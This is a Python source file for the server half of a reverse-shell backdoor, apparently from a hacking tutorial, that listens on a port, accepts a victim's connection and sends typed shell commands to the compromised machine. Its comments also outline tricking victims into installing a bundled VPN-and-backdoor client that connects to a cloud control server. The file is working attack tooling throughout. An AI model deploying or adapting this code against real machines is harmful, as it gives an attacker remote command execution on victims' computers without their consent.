##!/usr/bin/python
import os
import socket
import json
# To allow base64 encode() & decode() for files
import base64

# Passing 'data' as arg
def reliable_send(data):
    json_data = json.dumps(data)
    # To allow us sending as much commands & inputs as possible
    target.send(json_data.encode())

def reliable_recv():
    # Preparing to store json_data as bytes
    json_data = b''
    # To allow us run Backdoor until out of bytes
    # Instead of just 1024 bytes
    while True:
        try:
            #json_data += target.recv(1024)
            json_data += target.recv(1024)
            # "Backdoor coding.one\ncompile-reverse.sh\nREADME.md\nremove-compile.sh\nreverse_shell.py\nserver.py\n"
            # type(json_data_decode()) => String
            json_data_decode = json_data.decode()
            #print(f'json_data_decode: {json_data_decode}')
            print(f'***************************************')
            # type(json_data_decode_strip) => String
            #json_data_decode_strip = json_data.decode().strip()
            #print(f'json_data_decode_strip: {json_data_decode_strip}')
            print(f'***************************************')
            # json_data_decode = json_data_decode.split('\n')
            # clean_json_data = "".join(json_data_decode)
            # print(f'clean_json_data: {clean_json_data}')
            clean_json_data = json_data_decode.replace('\n', '')
            #print(f'clean_json_data: {clean_json_data}')
            print(f'***************************************')
            # Theory
            # If target.recv <= 1024 bytes
            #return json.loads(json_data.decode())
            #print(f'json_data_decode: {json_data_decode}')
            
            return json.loads(clean_json_data)
            # **** Working ****
            #return json.loads(json_data_decode)
            # **** Working ****
            
        except ValueError:
            # If we get ValueError
            # Will go over reliable_recv() over & over
            # This will break the contents down to 1024 bytes each time
            continue
    
def shell():
    # Infinite While loop
    while True:
        # Getting outputs from targets
        #message = input("* Shell#~%s: " % str(ip))
        command = input("* Shell#~%s: " % str(ip))
        # type(command) = str
        
        # Sending message.encode() to the target
        #target.send(message.encode())
        #target.send(command.encode())
        reliable_send(command)

        #if message == 'q':
        # Use strip() to remove any leading/trailing whitespace
        if command.strip() == 'q':
            # type(command) = str
            # type(command.strip()) = str
            break
            # continue to s.close()
        
        # For Changing Directory using 'cd' command
        elif command[:2].strip() == 'cd' and len(command.rstrip()) > 1:
            continue            
                
        else:
            # target receive 1024 bytes
            #result = target.recv(1024)
            #
            # If receiving packet > 1024 bytes => Backdoor crashes
            # e.g. running netstat -ano will crash this Backdoor
            result = reliable_recv()
            #print(f'answer:\n{answer.decode()}')
            print(f'result:\n{result}')

def server():
    # Scoping
    global s
    global ip
    global target
    # Make a server that listens to IPv4
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Binding to a port
    
    # In reality, you'll need to code a VPN client for your
    # victims to connect to your cloud network as if your
    # victims are in the same network of your Backdoor Server

    # Then, send your victims the bundle of VPN+Backdoor Clients
    # When your victims click the link, they're instantly 
    # connected to your Cloud Backdoor Server
    # Then, this Backdoor client is connected as if locally to
    # your Cloud Backdoor Server ;)

    # Thus, the IP_ADDRESS in both server.py & reverse_shell.py
    # shall be the localhost IP address 
    # of your Cloud Backdoor Server ;)
    
    # If you insist performing the captioned procedure, then
    # you'll be crossing the boundary of Ethical Hacking ;)
    # FBI is watching you :D
    IP_ADDRESS = '192.168.2.16'
    #IP_ADDRESS = '127.0.0.1'
    # Your Cloud Backdoor Server should be running server.py all the time
    port = 54321
    print(f'Binding port: {port}...\n')
    s.bind((IP_ADDRESS, port))
    number_of_connections = 5
    print(f'number_of_connections: {number_of_connections}\n')
    s.listen(number_of_connections)
    print(f'Listening for Incoming connections...\n')
    target, ip = s.accept()
    print(f'Target: {target} Connected!\n')

server()
shell()
s.close()